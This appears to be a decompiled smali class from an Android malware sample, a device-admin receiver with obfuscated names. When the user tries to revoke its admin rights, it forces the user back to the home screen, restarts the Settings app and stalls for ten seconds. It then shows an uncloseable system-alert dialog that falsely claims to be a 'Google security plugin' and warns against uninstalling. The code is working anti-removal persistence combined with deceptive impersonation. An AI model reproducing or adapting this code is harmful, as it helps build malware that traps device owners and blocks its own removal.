.class public Lji/yj/ur/a201jhfg20180420ab/JM06;
.super Landroid/app/admin/DeviceAdminReceiver;
.source "JM06.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 10
    invoke-direct {p0}, Landroid/app/admin/DeviceAdminReceiver;-><init>()V

    return-void
.end method

.method private uuuu(Landroid/content/Context;)V
    .locals 3
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 34
    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.intent.action.MAIN"

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 35
    .local v1, "toHome":Landroid/content/Intent;
    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 36
    const-string v2, "android.intent.category.HOME"

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    .line 37
    invoke-virtual {p1, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 39
    const-string v2, "activity"

    invoke-virtual {p1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    .line 38
    check-cast v0, Landroid/app/ActivityManager;

    .line 40
    .local v0, "mAm":Landroid/app/ActivityManager;
    const-string v2, "com.android.settings.DeviceAdminSettings"

    invoke-virtual {v0, v2}, Landroid/app/ActivityManager;->restartPackage(Ljava/lang/String;)V

    .line 41
    const-string v2, "com.android.settings"

    invoke-virtual {v0, v2}, Landroid/app/ActivityManager;->restartPackage(Ljava/lang/String;)V

    .line 42
    return-void
.end method


# virtual methods
.method protected nnnn(Landroid/content/Context;)V
    .locals 3
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 24
    new-instance v0, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;

    invoke-direct {v0, p0, p1}, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;-><init>(Lji/yj/ur/a201jhfg20180420ab/JM06;Landroid/content/Context;)V

    .line 25
    .local v0, "tttt":Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;
    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;->setCancelable(Z)V

    .line 26
    invoke-virtual {v0}, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;->getWindow()Landroid/view/Window;

    move-result-object v1

    const/16 v2, 0x7d3

    invoke-virtual {v1, v2}, Landroid/view/Window;->setType(I)V

    .line 27
    const-string v1, "\u6e29\u99a8\u63d0\u793a"

    invoke-virtual {v0, v1}, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;->setTitle(Ljava/lang/CharSequence;)V

    .line 28
    const-string v1, "\u8be5\u7a0b\u5e8f\u4e3a\u8c37\u6b4c\u5b89\u5168\u63d2\u4ef6\u8bf7\u52ff\u8fdb\u884c\u5378\u8f7d\u64cd\u4f5c,\u672c\u7a97\u53e3\u65e0\u6cd5\u5173\u95ed\u8bf7\u91cd\u65b0\u542f\u52a8\u624b\u673a\u5e76\u8bf7\u52ff\u518d\u8fdb\u884c\u5378\u8f7d\u64cd\u4f5c."

    invoke-virtual {v0, v1}, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;->setMessage(Ljava/lang/CharSequence;)V

    .line 29
    invoke-virtual {v0}, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;->show()V

    .line 31
    return-void
.end method

.method public onDisableRequested(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;
    .locals 3
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 13
    invoke-direct {p0, p1}, Lji/yj/ur/a201jhfg20180420ab/JM06;->uuuu(Landroid/content/Context;)V

    .line 15
    :try_start_0
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    const-wide/16 v1, 0x2710

    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 20
    :goto_0
    const-string v1, "\u4e3a\u4e86\u60a8\u7684\u624b\u673a\u5b89\u5168\uff0c\u8bf7\u4e0d\u8981\u53d6\u6d88\u63d2\u4ef6"

    return-object v1

    .line 16
    :catch_0
    move-exception v0

    .line 18
    .local v0, "e":Ljava/lang/InterruptedException;
    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_0
.end method
